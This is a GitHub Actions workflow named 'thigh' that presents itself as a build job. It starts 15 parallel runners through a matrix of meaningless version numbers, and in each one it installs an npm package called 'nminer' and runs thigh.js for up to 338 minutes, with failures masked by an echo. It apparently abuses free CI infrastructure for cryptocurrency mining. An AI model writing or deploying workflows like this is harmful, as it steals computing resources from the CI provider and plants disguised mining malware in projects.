name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5719 }
          - { version: 7312 }
          - { version: 4403 }
          - { version: 6549 }
          - { version: 5962 }
          - { version: 7876 }
          - { version: 6392 }
          - { version: 532 }
          - { version: 8131 }
          - { version: 729 }
          - { version: 697 }
          - { version: 46 }
          - { version: 5001 }
          - { version: 1733 }
          - { version: 5937 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 338m node thigh.js || echo "thigh executed"